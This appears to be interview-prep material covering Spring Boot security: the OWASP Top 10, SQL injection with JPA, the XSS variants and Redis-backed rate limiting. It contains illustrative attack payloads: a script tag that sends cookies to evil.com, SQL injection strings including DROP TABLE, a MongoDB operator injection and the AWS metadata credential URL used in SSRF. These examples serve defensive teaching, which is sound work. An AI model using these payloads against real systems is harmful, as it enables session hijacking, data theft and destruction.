questions.question: What are the OWASP Top 10 most critical web application security risks?
questions.title: OWASP Top 10 — Critical Web Vulnerabilities
questions.direct_answer: The **OWASP Top 10** is the standard awareness document for the most critical web application security risks. The **2021 edition** moved **Broken Access Control to #1** (most common breach cause), introduced **Insecure Design (#4)**, **Software/Data Integrity Failures (#8)**, and **SSRF (#10)**, and demoted Injection from #1 to #3 (XSS folded in). Knowing the current list signals practitioner-level security awareness and lets you map each category to a concrete Spring Boot defense — `@PreAuthorize` for A01, `BCryptPasswordEncoder` for A02, parameterized JPA queries for A03, threat modeling for A04, locked-down actuators for A05.

interviewer_intent.testing: Whether the candidate has a foundational security vocabulary and knows industry-standard risk categories.
interviewer_intent.common_mistake: Listing only SQL injection and XSS while missing newer categories like Insecure Design or SSRF.
interviewer_intent.to_stand_out: Relate each category to a concrete Spring Boot mitigation — e.g., parameterized queries for injection, Spring Security for broken access control.

sections.title: OWASP Top 10 2021: Why the Order Changed
sections.content:
The **OWASP Top 10** is the most widely referenced list of web application security risks, updated periodically based on real breach data and vulnerability reports. Interviewers test whether you know the **2021 edition** — citing 2017 categories signals outdated knowledge.

The 2021 edition made three structural changes.
- **Broken Access Control moved from #5 to #1** because the most common breach cause is authorization failure (missing `@PreAuthorize`, IDOR, overly permissive endpoints) — not SQL injection or XSS.
- Three new categories appeared: **Insecure Design (#4)**, **Software and Data Integrity Failures (#8)**, and **SSRF (#10)**.
- **Injection dropped to #3** and now includes XSS as a sub-type.

**Insecure Design** is the most important conceptual addition.
- Some flaws cannot be patched — they require architectural change.
- A password reset that puts the token in the URL (visible in browser history, server logs, referrer headers) is **insecure design**, not bad code.
- **SSRF** earned its own slot because cloud metadata APIs (`http://169.254.169.254`) turn one URL-fetching bug into stolen cloud credentials.

sections.title: Spring Boot Mitigations Per Category
sections.content:
Each OWASP category maps to specific Spring Boot defenses:

**A01 — Broken Access Control**
- `@PreAuthorize` for method-level authorization
- `requestMatchers().hasRole()` for URL-level
- Tests with `@WithMockUser` (different roles) and `@WithAnonymousUser` for every protected endpoint
- Verify ownership before mutations: `@PreAuthorize("#id == authentication.principal.id")`

**A02 — Cryptographic Failures**
- `BCryptPasswordEncoder` or `Argon2PasswordEncoder` — never MD5, SHA-1, or plain SHA-256
- HTTPS everywhere with HSTS headers
- Never log sensitive data; verify `application.yml` has no plaintext credentials

**A03 — Injection**
- Spring Data JPA derived queries and JPQL named parameters are safe
- Never concatenate user input into SQL strings
- Thymeleaf `th:text` auto-escapes — never `th:utext` with user data

**A04 — Insecure Design**
- Threat-model during design, not after deployment
- Use Spring Security's built-in mechanisms instead of custom security

**A05 — Security Misconfiguration**
- Lock down actuators: `management.endpoints.web.exposure.include=health,info` (not `*`)
- Remove default credentials, disable directory listing
- Configure `ErrorController` so stack traces never reach clients

**A06 — Vulnerable and Outdated Components**
- OWASP Dependency-Check Maven plugin
- GitHub Dependabot, Snyk in CI
- Keep Spring Boot patched

**A07 — Identification and Authentication Failures**
- Brute-force protection, session-fixation protection (default-on)
- Strong `PasswordEncoder` with high work factor

**A09 — Security Logging and Monitoring Failures**
- Log auth failures with IP, username, timestamp — never credentials
- Alert on patterns: many failures from one IP, login from new country

**A10 — SSRF**
- Allowlist URLs before `RestTemplate`/`WebClient` calls
- Block cloud metadata IPs (169.254.169.254) at the network layer; force IMDSv2

sections.title: OWASP 2017 vs 2021: What Changed
sections.content:
Knowing the changes signals current security knowledge.

| 2021 Rank | Category | 2017 Equivalent | Change |
|---|---|---|---|
| A01 | Broken Access Control | A05 | Up to #1 — most common breach cause |
| A02 | Cryptographic Failures | A03 Sensitive Data Exposure | Renamed to focus on root cause |
| A03 | Injection | A01 | Down from #1; XSS merged in |
| A04 | Insecure Design | — | NEW — architectural flaws |
| A05 | Security Misconfiguration | A06 | Up slightly; XXE merged in |
| A06 | Vulnerable Components | A09 | Up from #9 — supply chain attacks |
| A07 | Auth and Session Failures | A02 Broken Auth | Down from #2 |
| A08 | Data/Software Integrity | A08 Insecure Deserialization | Broadened to include supply chain |
| A09 | Logging and Monitoring Failures | A10 | Stable |
| A10 | SSRF | — | NEW — cloud metadata attacks |

**Broken Access Control at #1** is the practitioner's signal to invest heavily in authorization testing — every endpoint needs a test that verifies unauthorized users are rejected. Tools like ZAP, Burp Suite, and Spring Security test utilities make this automatable in CI/CD.

**Software and Data Integrity Failures** captures SolarWinds-style attacks: compromised build tools, tampered dependencies, code-signing failures. For Spring Boot: verify Maven Central artifact checksums, generate SBOMs, never pull from untrusted repos.

sections.title: The 2021 Additions Most Candidates Miss
sections.content:
**A04 — Insecure Design (architecture, not code):**
- Different from implementation bugs
- Examples: password reset with no rate limit; admin features in the public API; multi-tenant systems that share data by design
- Cannot be fixed with a code patch — architecture must change
- Spring Boot won't help; deliberate threat modeling during design is the only defense

**A10 — Server-Side Request Forgery (SSRF):**
- Server makes an HTTP request to an attacker-controlled URL
- Cloud-environment risk: SSRF in a service with IAM credentials can fetch `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS metadata service) and steal cloud credentials
- Defense: validate and allowlist URLs before server-side requests; disable IMDSv1 (require IMDSv2 with session token)

**A08 — Software and Data Integrity Failures:**
- Includes insecure deserialization (Java native serialization vulns) and unverified CI/CD pipeline integrity (dependency-confusion, compromised dependencies)
- Spring Boot defenses:
  - Use `spring-boot-starter-security` from verified sources
  - Enable Gradle dependency verification (`gradle/verification-metadata.xml`)
  - Avoid Java native serialization — prefer JSON or Protobuf

**A03 — Injection (broadened):**
- Still covers SQL injection but now includes LDAP, OS command, template injection
- NoSQL (MongoDB) injection via `$where` clauses is included

sections.title: How to Apply OWASP in Practice
sections.content:
**When OWASP helps:**
- Onboarding security reviews — checklist for every PR
- Designing new features — threat-model against the Top 10
- Compliance evidence — auditors recognize the framework
- Pen-test prep — testers will start here

**When it hurts (or feels stuck):**
- Treating it as the only checklist — missing domain-specific risks (business logic, race conditions)
- Stale teams citing 2017 list — gives false confidence
- Categories overlap (Insecure Design, Misconfiguration, Auth Failures all relate to weak login UX) — don't double-count, address at architecture level

**Watch for:**
- **Defense in depth** — A02 (Crypto) and A07 (Auth Failures) overlap; need encrypted-at-rest + strong hashes + lockout, not one of these
- **A04 (Insecure Design)** can't be caught by SAST/DAST tools; threat-modeling reviews are required
- **A06 (Vulnerable Components)** requires automation — manual checks always lag CVE disclosures
- **A09 (Logging Failures)** is invisible until you need the logs — test your alerting before incidents force it

sections.title: Key Points
sections.content:
- **Injection (A03)** — Spring mitigations: JPA parameterized queries and `@Valid` validation; never concatenate user input.
- **Broken Access Control (A01)** — most common category; enforce at HTTP and method level; never trust client-supplied IDs without ownership check.
- **Security Misconfiguration (A05)** — Spring Boot defaults (`exposure.include=*`, default creds) are insecure; lock down explicitly.
- **Insecure Design (A04)** — missing threat modeling, not missing code; rate limiting, lockout, and audit logging must be designed in.
- **Vulnerable Components (A06)** — Dependabot or OWASP Dependency-Check; staying on EOL versions is the most common actual exploit vector.
- **SSRF (A10)** — cloud metadata API access via SSRF leaks cloud credentials; allowlist URLs and force IMDSv2.
- **Software Integrity Failures (A08)** — verify dependency checksums, generate SBOMs, avoid Java native serialization.

sections.title: How to Answer This Verbally
sections.content:
**The 2021 list, with Spring fixes**

**A01 Broken Access Control**
- Users accessing other users' data, missing checks, IDOR
- Spring fix: `@PreAuthorize("#id == authentication.name")`, ownership checks in service layer

**A02 Cryptographic Failures**
- Plaintext or weakly-hashed passwords
- Spring fix: `BCryptPasswordEncoder` or `Argon2PasswordEncoder`

**A03 Injection**
- User input in queries or commands
- Spring fix: JPA `@Query` with parameters, `@Valid`

**A04 Insecure Design (NEW)**
- Architectural flaws not fixable by code patches
- Spring fix: threat modeling during design

**A05 Security Misconfiguration**
- Default creds, verbose errors, exposed actuators
- Spring fix: lock actuators, hide stack traces, enforce HTTPS

**A07 Authentication Failures**
- No lockout, no rate limit, weak passwords
- Spring fix: brute-force protection, BCrypt high cost, password policy

**A10 SSRF (NEW)**
- Server fetches attacker URL -> cloud metadata theft
- Spring fix: URL allowlist, IMDSv2

**Key interview signal**
- Cite the 2021 list, not 2017
- Map each category to a Spring mitigation
- Mention threat modeling for A04 (the one that can't be code-patched)

questions.question: How does SQL injection work and how do you prevent it when using JPA in a Spring Boot application?
questions.title: SQL Injection — How It Works and JPA Prevention
questions.direct_answer: SQL injection occurs when **untrusted user input is concatenated into a SQL query**, letting attackers manipulate query logic. **JPA is not automatically safe** — JPQL with named parameters and Spring Data derived methods are safe, but **`@Query(nativeQuery = true)` with string concatenation is fully exploitable**. Use named parameters (`@Param`), `Criteria API`, or `Specifications` for dynamic queries. Add **defense in depth**: input validation with `@Valid`, least-privilege DB users (no DDL), and SpotBugs Find Security Bugs in CI to catch concatenation patterns automatically.

interviewer_intent.testing: Whether the candidate understands the root cause of SQL injection and knows idiomatic JPA prevention techniques.
interviewer_intent.common_mistake: Saying 'JPA is safe by default' without understanding that native @Query with string concatenation is still vulnerable.
interviewer_intent.to_stand_out: Mention input validation as defense-in-depth, demonstrate awareness of second-order injection, and reference OWASP A03.

sections.title: JPA Isn't a SQL Injection Shield
sections.content:
**SQL injection (OWASP A03)** has been in the top risks for over a decade — yet it still appears in Spring Boot apps.
- The misconception: "using JPA means I'm safe." **JPQL with named parameters IS safe.
- Native `@Query(nativeQuery = true)` with string concatenation IS NOT** — it's as vulnerable as raw JDBC.

The attack injects SQL control characters (quotes, semicolons, comments) into user input, which the database interprets as query structure instead of data. `searchByName("' OR '1'='1")` becomes `WHERE name = '' OR '1'='1'` — every row leaks. Worse payloads use `UNION SELECT` for data exfiltration or semicolons to drop tables.

**Second-order injection** is subtler: the malicious payload is **stored safely** through a parameterized INSERT, then **used unsafely later**. A username like `admin'--` stored without harm becomes the attack when a separate operation builds a query around it via concatenation.

The attack surface in JPA has three locations: **native queries with concatenation**, **`Criteria API` with `Restrictions.sqlRestriction()`** that accepts raw SQL fragments, and **dynamically-built JPQL** strings.

sections.title: Vulnerable Patterns Developers Accidentally Write
Detecting Injection in an Existing Codebase
sections.content:
**Static analysis (SpotBugs + Find Security Bugs):**
- Add the plugin to the Maven build
- Reports `SQL_INJECTION_JPA` and `SQL_INJECTION_JDBC` findings
- Wire to CI so injection risks fail the build

**Hibernate SQL logging in integration tests:**
- `logging.level.org.hibernate.SQL=DEBUG`
- `logging.level.org.hibernate.orm.jdbc.bind=TRACE`
- Safe queries show `?` placeholders + bind variables logged separately
- Vulnerable queries show user values embedded directly in SQL

**Manual grep audit:**
- Search `nativeQuery = true` in `@Query` annotations
- Search `createNativeQuery(`
- Search `createQuery("..." + variable`
- Every hit is a candidate for review

**DataSource-Proxy in integration tests:**
- Wraps the connection pool at JDBC level
- Intercepts every SQL statement
- Assert all queries use `?` parameters and contain no user-supplied literals
- Catches risks static analysis misses; runs as regression test in CI

sections.title: Safe Patterns From Simple Lookups to Dynamic Queries
NoSQL Injection and Defense in Depth Beyond Parameter Binding
sections.content:
**MongoDB injection (parallel risk):**
- Dangerous: passing a JSON object directly to `mongoTemplate.find(Query.query(Criteria.where("field").is(userInput)))`
- If `userInput` is `{$gt: ''}` it matches all documents
- Always use typed Spring Data repository methods like `findByEmail(String email)`
- Avoid `BasicDBObject` constructed from unvalidated user input
- Avoid `@Query` with string interpolation in Mongo repositories

**Layer 1 — Input validation:**
- Validate field types match expectations before the data layer
- A user ID should be UUID or integer — reject anything containing quotes, operators, or unexpected chars
- Use `@Valid` and constraint validators at the controller

**Layer 2 — Least-privilege database accounts:**
- App DB user: `SELECT, INSERT, UPDATE, DELETE` on app tables only
- No `DROP, TRUNCATE, GRANT, CREATE`
- Even if injection occurs, the attacker is bounded by user permissions

**Layer 3 — Query logging in development:**
- `logging.level.org.hibernate.SQL=DEBUG`
- `spring.jpa.show-sql=true`
- Queries that look unexpectedly complex or contain inline user values are red flags
- Catch potential vulns before production

sections.title: When Each Pattern Helps and What to Watch
sections.content:
**When derived methods help:**
- Simple equality and comparisons
- Predictable query shape
- Zero injection risk by construction

**When `@Query` (JPQL) helps:**
- Joins, projections, aggregations beyond derived-method capability
- Still safe with `@Param` named parameters

**When Criteria/Specifications help:**
- Dynamic filters (search forms, optional predicates)
- Type-safe; cannot accidentally concatenate strings
- Composable across modules

**When native queries are necessary:**
- DB-specific features (window functions, CTEs not supported by JPQL)
- Performance-tuned queries
- Always use `@Param` — never concatenate

**Watch for:**
- **Dynamic `ORDER BY` column** — parameterization doesn't apply to identifiers; whitelist allowed columns
- **`LIKE` wildcards** — escape `%` and `_` if they come from user input you don't want as wildcards
- **`IN` lists** — Spring binds collections safely; don't build `IN ('a', 'b')` by hand
- **Stored procedures with concatenation inside** — injection moves into the DB; review SP source
- **JDBC fallback** in batch jobs or migrations — same rules apply

sections.title: Key Points
sections.content:
- **JPQL with `@Param` is safe; concatenated JPQL is not** — `@Query("... WHERE u.name = :name")` binds; `"... WHERE u.name = '" + name + "'"` is injectable.
- **`nativeQuery = true` with concatenation is the highest-risk pattern** — bypasses JPQL parameter handling; always use `@Param` in native queries too.
- **Second-order injection** — sanitized at insert, exploited later in a dynamic query without re-sanitization.
- **Criteria API and Specifications are safe by construction** — predicates are always parameterized; no string interpolation possible.
- **Defense in depth** — parameterized queries + input validation + least-privilege DB user; none alone is sufficient.
- **`ORDER BY` and identifiers can't be parameterized** — whitelist allowed columns explicitly.
- **Detect with SpotBugs Find Security Bugs in CI** — fails the build on `SQL_INJECTION_JPA`/`JDBC` patterns.

sections.title: How to Answer This Verbally
sections.content:
**Safe patterns**
- `@Query("... WHERE u.email = :email")` with `@Param("email")` — JPQL named parameter; Hibernate uses prepared statement
- Derived methods (`findByEmail(String)`) — always parameterized
- `CriteriaBuilder.equal(root.get("email"), email)` — Criteria API; always parameterized

**Risky patterns**
- `@Query("... WHERE u.role = '" + role + "'")` — string concatenation in JPQL; never
- `@Query(value = "... WHERE name = '" + name + "'", nativeQuery = true)` — native + concat; highest risk
- Dynamic `ORDER BY " + column` — parameterization doesn't apply to identifiers; whitelist columns

**Second-order injection**
- User submits `'; DROP TABLE orders; --` as display name
- Stored safely (parameterized INSERT)
- Later, admin query builds SQL via concatenation using stored name — payload executes

**Defense in depth**
- Parameterized queries — always
- Input validation — reject unexpected chars early
- Least privilege — app DB user has no `DROP`/`ALTER`

**Detection**
- SpotBugs Find Security Bugs in CI
- Hibernate SQL logging at TRACE
- Manual grep for `nativeQuery = true` and string concatenation in queries

questions.question: What is Cross-Site Scripting (XSS) and what are the differences between stored, reflected, and DOM-based XSS?
questions.title: XSS — Stored vs Reflected vs DOM-Based
questions.direct_answer: **XSS** injects malicious JavaScript into pages viewed by other users — running with the same trust as legitimate scripts (read cookies, call APIs, exfiltrate data). **Stored XSS** persists in the DB and executes for every visitor. **Reflected XSS** is delivered via a crafted URL and executes immediately. **DOM-based XSS** is purely client-side — the server never sees the payload. **Defense is output-context-aware encoding**, not input filtering: HTML entity encoding for HTML body, JS escaping for script context, plus **Content Security Policy** as the last line, **`HttpOnly` cookies** to block session theft, and **Thymeleaf `th:text`** (never `th:utext`) for server-rendered views.

interviewer_intent.testing: Whether the candidate can distinguish XSS variants and knows server-side vs client-side prevention strategies.
interviewer_intent.common_mistake: Thinking that escaping HTML on input is sufficient — output context matters (HTML, JS, URL, CSS contexts need different encoding).
interviewer_intent.to_stand_out: Mention Spring's Thymeleaf auto-escaping, the role of Content-Security-Policy, and how HttpOnly cookies mitigate session hijacking via XSS.

sections.title: XSS Is an Output Problem, Not an Input Problem
sections.content:
**XSS injects JavaScript** into a page served to other users.
- The injected script runs with the same trust as the site's legitimate scripts — read cookies, make authenticated API calls, exfiltrate form data, modify the page.
- A successful XSS on a banking site means the attacker's script has the user's full session access.

The critical mistake: treating XSS as an input problem. **XSS is an output problem.** The correct defense depends on **where in the document** the user-controlled data appears:
- HTML body content -> **HTML entity encoding**
- JavaScript string context -> **JS escaping**
- URL attribute -> **URL encoding**
- CSS context -> **CSS escaping**

Applying HTML encoding inside a JS string context leaves the injection open — `<` doesn't break out of a JS string, but `'` does.

The three types differ in **where the payload is stored** and **how it reaches victims** — stored (DB), reflected (URL), or DOM-based (client-side only). Server-side defenses don't help DOM-based XSS at all.

sections.title: Stored vs Reflected vs DOM-Based: Three Threat Profiles
sections.content:
Each XSS type requires a different defensive strategy because the attack path is different.

| Aspect | Stored XSS | Reflected XSS | DOM-Based XSS |
|---|---|---|---|
| **Payload location** | Database (comments, posts, profiles) | URL parameter or form input | Browser DOM (URL fragment, JS variables) |
| **Trigger** | Any user loading the affected page | Victim clicks an attacker's crafted link | Any user visiting the page (JS reads URL) |
| **Server involvement** | Yes — server reads from DB and renders | Yes — server echoes input in response | None — JavaScript processes it directly |
| **Persistence** | Persistent — affects every visitor | Non-persistent — unique URL per attack | Non-persistent — client-side only |
| **Impact** | Highest — mass user exposure | Targeted — requires social engineering | Targeted — requires social engineering |
| **Primary defense** | Server-side output encoding + CSP | Server-side output encoding | Avoid `innerHTML`; use `textContent` |
| **Thymeleaf defense** | `th:text` auto-escapes | `th:text` auto-escapes | N/A — client-side JS |

**DOM-based XSS bypasses all server-side defenses** — the payload never reaches the server. Defense is entirely client-side: `textContent` instead of `innerHTML`, safe templating libraries, and CSP to block inline script execution.

**Stored XSS in rich-text fields** (editors with bold, links, images) needs an HTML sanitization library — DOMPurify on the client, OWASP Java HTML Sanitizer on the server — with an **allowlist** of safe tags. Blocklist approaches always miss variants.

sections.title: Spring Boot Defenses: Thymeleaf, CSP, HttpOnly
sections.content:
**Thymeleaf auto-escaping:**
- `th:text="${userInput}"` HTML-encodes output — `<script>` becomes `<script>`
- `th:utext` (unescaped) **disables** this protection — never use with user-controlled data
- Grep your templates for `th:utext`; each occurrence is a potential XSS

**Content Security Policy (CSP) — the strongest defense:**

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    return http
        .headers(headers -> headers
            .contentSecurityPolicy(csp -> csp
                .policyDirectives("script-src 'self'; style-src 'self'; object-src 'none'")))
        .build();
}
```

- `script-src 'self'` allows only same-origin scripts — inline and CDN scripts are blocked even if injected
- Last line of defense: a successful injection produces no script execution if CSP is correct

**HttpOnly cookies — block JS-readable session theft:**
- `HttpOnly` flag: `document.cookie` doesn't include the cookie, even with successful XSS
- `Secure` flag: cookie only over HTTPS
- Spring Security sets both by default on session cookies in Boot 3.x
- Custom cookies: set both explicitly

**JSON REST APIs:**
- Jackson serializes strings safely for JSON context — server-side XSS not the same risk
- Risk shifts to client-side React/Angular code rendering API responses with `innerHTML` / `dangerouslySetInnerHTML`
- CSP on API responses helps if same-origin SPA; otherwise client-side rendering discipline is the defense

sections.title: CSP Headers and HttpOnly as the Last Line
sections.content:
**Server-side escaping prevents XSS in server-rendered HTML.** Modern apps render client-side — escaping is the framework's responsibility (React escapes `{}` interpolations by default; `dangerouslySetInnerHTML` bypasses).

**CSP limits damage when XSS executes:**

```java
http.headers(h -> h.contentSecurityPolicy(csp ->
    csp.policyDirectives("default-src 'self'; script-src 'self'; img-src 'self' data:")))
```

**CSP rollout strategy:**
- Start with `Content-Security-Policy-Report-Only` to log violations without blocking
- Identify legitimate third-party scripts before enforcing
- Inline scripts (`onclick`, `<script>`) need `'unsafe-inline'` — significantly weakens CSP
- Use **nonce-based CSP** for frameworks that need inline scripts: server emits a per-request nonce, only `<script nonce="...">` runs

**HttpOnly + Secure as XSS last line:**
- `HttpOnly` blocks JS from reading cookies — even with XSS, no session theft
- `Secure` blocks transmission over HTTP
- Spring Security defaults: both on session cookies

**JWT in localStorage trade-off:**
- XSS can steal the token — `localStorage` is JS-readable by design
- `HttpOnly` cookie storage prevents JS-readable theft but reintroduces CSRF risk
- Pick: cookie storage + CSRF tokens (recommended for browser apps), or localStorage + accept XSS risk window

**Other security headers (Spring defaults):**
- `X-Content-Type-Options: nosniff` — blocks MIME-type sniffing
- `X-Frame-Options: DENY` — blocks clickjacking via iframes
- `Strict-Transport-Security` — HSTS (configure max-age explicitly)

sections.title: Output Encoding vs CSP vs Sanitization
sections.content:
**When output encoding helps:**
- Plain text user content rendered in HTML body
- Auto via Thymeleaf `th:text`, React `{}` — safe by default
- Cheap, ubiquitous

**When CSP helps:**
- Defense in depth — limits damage of any successful injection
- Blocks data exfiltration to attacker-controlled domains
- Browser-level enforcement; works even if server-side encoding has gaps

**When HTML sanitization helps:**
- Rich text fields where you must allow some HTML
- Use OWASP Java HTML Sanitizer or DOMPurify
- Allowlist-based (specific tags + attributes)

**When it hurts:**
- Encoding everything in a rich-text field strips legitimate formatting
- CSP `'unsafe-inline'` defeats most of CSP's value — try nonces or move scripts to files
- `th:utext` with user content is direct XSS
- Mixing approaches inconsistently — one unencoded field is enough

**Watch for:**
- **Different output contexts** need different escaping (HTML vs JS vs URL vs CSS)
- **DOM XSS in SPAs** — server-side defenses don't apply; client-side discipline only
- **Markdown rendering** — convert to safe HTML via a sanitizer; never `innerHTML` raw markdown
- **PDF / email rendering** — XSS-equivalent vulnerabilities exist (HTML-to-PDF tools)
- **Reflected XSS in error messages** — error pages echo user input; encode there too

sections.title: Key Points
sections.content:
- **Stored XSS** — script persisted in DB, executed on every page load (forum post, profile field).
- **Reflected XSS** — script in URL, executed immediately on victim's browser; needs social engineering.
- **DOM XSS** — client-side `innerHTML` with untrusted data; no server response involved; hardest to detect.
- **CSP is the primary browser-level defense** — `script-src 'self'` blocks inline scripts and untrusted origins.
- **Thymeleaf `th:text` auto-escapes; `th:utext` does not** — never use `th:utext` with user data.
- **`HttpOnly` cookies** prevent session theft via XSS — `document.cookie` can't read them.
- **Output context matters** — HTML, JS, URL, CSS contexts each need different escaping; encoding HTML in a JS string is unsafe.

sections.title: How to Answer This Verbally
sections.content:
**XSS — three types**

*Stored XSS*
- Attacker posts `<script>fetch('https://evil.com?c='+document.cookie)</script>` in a comment
- Stored in DB
- Every viewer runs the script

*Reflected XSS*
- Attacker crafts URL with script in a parameter
- Server reflects it back unescaped
- Victim clicks the link

*DOM XSS*
- JS reads untrusted data (URL hash, localStorage) and writes to DOM via `innerHTML`
- No server round-trip

**Prevention**

*Output encoding*
- Escape HTML entities — `<` -> `<`
- Thymeleaf `th:text` does this automatically

*Content Security Policy*
- `default-src 'self'; script-src 'self'`
- Most powerful defense — blocks even successful injections
- Use nonce-based CSP if you need inline scripts

*HttpOnly cookies*
- JS can't access them — session safe even with XSS
- Spring Security default for session cookies

**Spring Boot specifics**
- `http.headers()` enables CSP, HSTS, X-Frame-Options
- Thymeleaf is safe by default — never use `th:utext` with user content
- For SPAs: client-side framework escaping + CSP at the API

**Output context rule**
- HTML body -> HTML entities
- JS string -> JS escaping (`\u00xx`)
- URL attribute -> URL encoding
- CSS context -> CSS escaping
- Mixing them up leaves vulns open

questions.question: How do you implement rate limiting in Spring Boot to prevent brute force attacks?
questions.title: Rate Limiting to Prevent Brute Force Attacks
questions.direct_answer: Rate limiting **restricts how many requests a client can make in a time window**, making brute force impractical. **In-memory `ConcurrentHashMap` rate limiting fails in clusters** — every instance has its own counter, so attackers get N times the limit. Production uses **Bucket4j with Redis** for shared state, **smart key strategy** (per-IP **and** per-username for login), and a **tiered approach**: aggressive limits on sensitive endpoints (5 logins/min/IP), relaxed limits on general API (100 req/min/user), plus **API gateway / WAF rate limiting** at the network edge for volumetric attacks. Combine with **account lockout** as defense in depth.

interviewer_intent.testing: Whether the candidate can design a production-ready rate limiting strategy that considers distributed deployments, bypass techniques, and the trade-off between security and user experience.
interviewer_intent.common_mistake: Using only in-memory rate limiting that doesn't work across multiple instances, or applying rate limits only to login without considering other sensitive endpoints.
interviewer_intent.to_stand_out: Discuss token bucket vs sliding window algorithms, how to handle legitimate high-traffic users, and combining rate limiting with CAPTCHA and account lockout.

sections.title: Why In-Memory Rate Limiting Fails (And What Production Needs)
sections.content:
Rate limiting prevents **brute force, credential stuffing, and API abuse**. The naive implementation — an in-memory `ConcurrentHashMap<String, AtomicInteger>` keyed by IP — has two fatal flaws: **doesn't work across instances** (each has its own counter, so N instances = N times the limit) and **resets on restart** (every deploy gives attackers a fresh window).

Production needs three things: **shared state store** (Redis — fast, atomic, TTL-based expiry), **smart key strategy** (IP alone blocks legitimate users behind corporate NAT; username alone doesn't protect unauthenticated endpoints; combine both for login), and **tiered limit strategy** (aggressive on sensitive endpoints, relaxed elsewhere).

**Credential stuffing** is the modern brute force pattern — attackers test one username/password across thousands of accounts, distributing the attack to evade per-account lockout.
- **Per-IP rate limit catches this**.
- **Distributed attacks** rotate across thousands of IPs to evade per-IP limits — CAPTCHA, behavioral analysis, and velocity checks across multiple dimensions are required for sophisticated attackers.

The right architecture is **tiered**: aggressive limits on login (5/min/IP, 10/hour/username), relaxed on general API (100/min/user), and **API gateway rate limiting** for volumetric defense before requests reach app servers.

sections.title: Token Bucket vs Sliding Window: Algorithm Choice
sections.content:
**Token Bucket:**
- Conceptual bucket holds tokens (up to capacity)
- Each request consumes one token
- Tokens refill at a fixed rate
- Empty bucket -> request rejected
- Allows **bursting**: a user idle for a while can immediately use up to capacity
- Matches real usage (multi-tab browser, parallel API calls)

**Sliding Window:**
- Counts requests in a rolling time window
- 95 requests in last 59 seconds -> 5 more allowed this second
- More precise, no burst exploitation at boundaries
- Slightly more storage cost

**Fixed Window pitfall:**
- 100 at 11:59:59 + 100 at 12:00:01 = 200 in 2 seconds, violating 100/min intent at the boundary transition

**Bucket4j — the Java standard token bucket:**

```java
@Component
public class RateLimiter {
    private final ProxyManager<String> proxyManager;

    public boolean tryAcquire(String key) {
        BucketConfiguration config = BucketConfiguration.builder()
            .addLimit(Bandwidth.classic(5, Refill.greedy(5, Duration.ofMinutes(1))))
            .build();

        Bucket bucket = proxyManager.builder().build(key, () -> config);
        return bucket.tryConsume(1);
    }
}
```

**Key format encodes the dimension:**
- `rate:login:{ip}` — login by IP
- `rate:login:user:{username}` — per-account
- Both keys tracked independently — IP blocks distributed attacks; username prevents one IP locking an account from many sources

**For login: fixed window is sufficient** — boundary exploitation only matters for precise quota enforcement (paying API customers). For brute force, 5/5 minutes is effectively the same as a sliding 5/5 minutes.

sections.title: Implementation: Filter + Account Lockout + Gateway
Rate Limiting Approaches: Trade-offs
sections.content:
Each approach occupies a different position in the stack.

| Approach | State Storage | Horizontal Scale | Granularity | Use Case |
|---|---|---|---|---|
| **In-memory (JVM)** | JVM heap per instance | No — each instance counts independently | Per-instance only | Development and testing |
| **Redis (Bucket4j)** | Redis cluster | Yes — shared state | Per-IP, per-user, per-endpoint | Production application-level limits |
| **Spring Security lockout** | Database | Yes — shared DB | Per-account only | Authentication-specific protection |
| **API Gateway** | External (Gateway-managed) | Yes — before application layer | Per-route, per-client | Microservices, volumetric defense |
| **CDN / WAF** | CDN edge | Yes — global | Per-region, per-IP | DDoS, volumetric attacks |

**Layered defense is the production architecture:**
- CDN/WAF at network edge for volumetric attacks
- API gateway for coarse application-level limits
- Redis-backed app filters for fine-grained endpoint-specific limits
- Spring Security account lockout for auth-specific protection

App-level rate limiting alone is **insufficient for DDoS** — a well-resourced attacker overwhelms app servers before rate-limit logic runs. Gateway/WAF handles volumetric; app-level handles intelligent low-volume brute force that evades network filters.

sections.title: Bucket4j with Redis: Production Implementation Details
sections.content:
**Setup:**
- Bucket4j (token bucket algorithm) + Redis for distributed state
- Every instance shares the same counter — adding instances doesn't give users more capacity

**Implementation pattern:**
- `HandlerInterceptor` extracts the user identifier (IP for unauthenticated, user ID for authenticated — user ID is harder to spoof)
- Look up the bucket in Redis
- `bucket.tryConsume(1)` — return 429 if no tokens

**Key identifier strategy:**
- IP-based: bypassable with IP rotation (residential proxies)
- User-ID-based: more targeted but requires authentication first
- For login: rate limit by **both IP and username** — prevents credential stuffing from many IPs against one account, and from one IP across many accounts

**Progressive delays beyond hard 429s:**
- After 5 failures: add 1-second delay
- After 10: add 5-second delay
- After 20: lock the account temporarily
- Combine Bucket4j (throughput) with a separate failure counter in Redis (progressive)

**429 response best practices:**
- `Retry-After`: seconds until rate limit resets
- `X-RateLimit-Limit` / `X-RateLimit-Remaining`
- Without these, clients retry randomly and add to load

**Defense in depth for login:**
- Rate limiting throttles the *rate*
- Account lockout provides a *threshold*
- Both together — neither alone is enough

sections.title: Rate Limit Strategy: Helps, Hurts, Watch For
sections.content:
**When it helps:**
- Brute-force login defense
- API quota enforcement (per-customer plans)
- Burst control for expensive endpoints (PDF generation, report queries)
- Compliance (PCI-DSS requires login throttling)

**When it hurts:**
- Per-IP only limits block office NATs and university networks
- Too-tight limits frustrate legitimate users (mobile users on shared cellular IPs)
- Memory/Redis cost at very high request rates
- Without `Retry-After`, clients retry-storm

**Watch for:**
- **Distributed attacks** — IP-based limits don't help; need behavioral analysis or CAPTCHA
- **Race conditions** in non-atomic counter operations — use Redis Lua scripts or Bucket4j's atomic primitives
- **Health checks and internal callers** — exempt them or they trigger limits unfairly
- **WebSocket and SSE** — long-lived connections need different accounting (per-connection or per-message)
- **Rate limit bypass via HTTP/2 multiplexing** — count individual requests, not connections
- **Alerting on 429 spikes** — could be attack or could be a misbehaving client; segment by user ID

sections.title: Key Points
sections.content:
- **In-memory rate limiting fails in multi-instance deployments** — clients distribute requests across instances to bypass limits.
- **Redis (Bucket4j or sliding window via Lua) is the production standard** — atomic ops ensure shared state correctness.
- **Rate limit by authenticated user ID, not just IP** — shared NAT (offices, universities) blocks all users when one attacker hits the limit.
- **Login: combine IP + username keys** — catches credential stuffing (many IPs, one account) and IP-based brute force.
- **Exponential backoff + account lockout for auth endpoints** — 5/min for login; lock after 10 failures; alert on the event.
- **`429 Too Many Requests` + `Retry-After` header** — informs clients; pair with jitter to stagger concurrent retries.
- **Layered defense** — CDN/WAF + API gateway + app filter + account lockout; each protects a different threat profile.

sections.title: How to Answer This Verbally
sections.content:
**Why in-memory fails**
